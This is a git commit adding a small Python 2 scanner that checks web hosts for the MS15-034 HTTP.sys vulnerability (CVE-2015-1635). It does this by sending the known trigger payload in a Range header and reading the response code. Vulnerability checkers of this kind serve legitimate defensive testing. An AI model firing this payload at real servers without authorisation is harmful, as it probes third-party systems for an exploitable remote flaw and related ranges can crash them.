a5c5b93e6e3aadf56a19ad0e94e5e23854c3b288
JT <shipcodez@gmail.com>
2015-04-17 09:53:07 +0800

    Create MS15-034_checker.py

---
+++ MS15-034_checker.py
@@ -0,0 +1,42 @@
+# MS15-034_checker.py
+# CVE-2015-1635
+# description: Checks if the host is vulnerable to MS15-034
+# reference: https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
+# author: @shipcod3
+
+import sys, requests
+
+def usage(argv):
+    print "Usage: python MS15-034_checker.py https://google.com"
+
+def main(argv):
+
+    print " -=MS15-034 / CVE-2015-1635: HTTP.sys Remote Code Execution Checker=-\n"
+
+    if len(argv) < 2:
+         return usage()
+
+    payload= "bytes=0-18446744073709551615"
+    rhost = sys.argv[1]
+
+    try:
+        r = requests.get("{}".format(rhost), headers={"Range": payload})
+        print "[+] Sending the payload: " + payload + " in Range header"
+
+        if r.status_code == 416 and 'Requested Range Not Satisfiable' in r.reason:
+            print "[-] Vulnerable"
+
+        elif 'The request has an invalid header name' in r.reason:
+            print "[+] Not Vulnerable - Patched"
+
+        else:
+            print "[+] Not Vulnerable"
+
+    except Exception as e:
+        print "Error! Check if host is online.."
+
+
+
+
+if __name__ == "__main__":
+    main(sys.argv)
